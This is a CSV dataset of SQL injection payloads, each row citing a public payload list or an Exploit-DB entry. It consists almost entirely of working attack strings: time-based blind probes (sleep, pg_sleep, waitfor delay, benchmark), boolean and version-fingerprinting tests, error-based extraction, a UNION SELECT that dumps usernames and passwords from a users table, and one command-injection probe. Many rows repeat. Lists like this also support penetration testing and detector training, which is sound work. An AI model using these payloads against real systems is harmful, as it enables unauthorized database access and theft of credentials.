cve,tag,payload,url
,SQL Injection,%' AND 8310=8310 AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,%' AND 8310=8311 AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,1,1))='X'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,1,1))='M'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,2,1))='i'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,2,1))='y'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,3,1))='c'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,3,1))='S'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"and (select substring(@@version,3,1))='X'",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or SLEEP(5)=""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05'#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))--",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))--",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"\""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5) ANd '1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)&&'1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RANDOMBLOB(500000000/2),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RANDOMBLOB(1000000000/2),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,# from wapiti,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or SLEEP(5)=""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,waitfor delay '00:00:05'#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))--",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(50000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))--",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(50000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"\""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AnD SLEEP(5) ANd '1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,&&SLEEP(5)&&'1,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,ORDER BY SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RANDOMBLOB(500000000/2),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,RANDOMBLOB(1000000000/2),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or sleep(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1 or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or sleep(5)=""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1 or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,") or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,") or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"1)) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"or sleep(5)=""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," 1 or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"  or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,") or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," ') or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," 1)) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," )) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,SLEEP(5)=,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection, or sleep(5)#,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"  or sleep(5)=""",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,;waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,);waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,));waitfor delay '0:0:5'--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," 1 or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,"  or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,") or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," ') or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection," 1)) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,")) or benchmark(10000000,MD5(1))#",https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,)) or pg_sleep(5)--,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',https://github.com/payloadbox/sql-injection-payload-list
,SQL Injection,1' AND 8462=8462 AND 'jgHw'='jgHw,https://www.exploit-db.com/exploits/51482
,SQL Injection,"1' AND (SELECT 1839 FROM(SELECT COUNT(*),CONCAT(0x7178717171,(SELECT(ELT(1839=1839,1))),0x7176786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cqhk'='Cqhk",https://www.exploit-db.com/exploits/51482
,SQL Injection,1' AND (SELECT 1072 FROM (SELECT(SLEEP(5)))lurz) AND 'RQzT'='RQzT,https://www.exploit-db.com/exploits/51482
,SQL Injection,""";id+##",https://www.exploit-db.com/exploits/51481
,SQL Injection,deneme' AND (SELECT 8068 FROM (SELECT(SLEEP(5)))qUdx) AND 'nbTo'='nbTo,https://www.exploit-db.com/exploits/51474
,SQL Injection,1') AND (SELECT 9595 FROM (SELECT(SLEEP(5)))YRMM) AND ('gaNg'='gaNg,https://www.exploit-db.com/exploits/51473
,SQL Injection,online_courses.category_id AND (SELECT 7313 FROM (SELECT(SLEEP(5)))mvaR)--,https://www.exploit-db.com/exploits/51472
,SQL Injection,"id,xid,name,price,product_type,tax_rate,tax_label,logo,logo_url&filters=name lk ""%aa%"") AND (SELECT 6593 FROM (SELECT(SLEEP(5)))qBNH) AND (8549=8549&order=id desc&offset=0&limit=10",https://www.exploit-db.com/exploits/51471
,SQL Injection,"-999' Union Select 1,2,3,4,5,6,7,8,9,concat(ID,0x3a,USERNAME,0x3a,PASSWORD),11,12,13,14,15,16 from users-- -",https://www.exploit-db.com/exploits/51468
,SQL Injection,-',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, ',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,&',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,^',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,*',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or 1=1 limit 1 -- -+,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"=""or'",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or ''-',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or '' ',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or ''&',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or ''^',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or ''*',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,-||0',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""-||0""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""-""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" """,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""&""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""^""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""*""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,--',https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"""--""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,"--' / ""--""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or """"-""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or """" """,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or """"&""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or """"^""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or """"*""",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,or true--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection,""" or true--",https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
,SQL Injection, or true--,https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
